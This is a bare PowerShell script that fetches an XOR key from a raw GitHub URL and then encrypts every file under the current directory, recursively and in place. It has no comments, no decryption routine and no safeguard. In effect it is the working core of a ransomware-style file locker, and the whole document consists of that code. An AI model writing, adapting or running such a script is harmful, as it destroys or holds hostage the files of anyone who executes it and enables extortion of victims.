function Xor-File {
    param (
        [string]$FilePath,
        [string]$Key
    )
    $FileData = [System.IO.File]::ReadAllBytes($FilePath)
    $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $KeyLength = $KeyBytes.Length
    $XorResult = New-Object byte[] $FileData.Length

    for ($i = 0; $i -lt $FileData.Length; $i++) {
        $XorResult[$i] = $FileData[$i] -bxor $KeyBytes[$i % $KeyLength]
    }

    [System.IO.File]::WriteAllBytes($FilePath, $XorResult)
}

$keyUrl = "https://raw.githubusercontent.com/Sp4c3K/holahela/main/key"
$key = Invoke-WebRequest -Uri $keyUrl -UseBasicParsing | Select-Object -ExpandProperty Content
$key = $key.Trim()
$currentDir = Get-Location
Get-ChildItem -Path $currentDir -Recurse -File | ForEach-Object {
    Xor-File -FilePath $_.FullName -Key $key
}
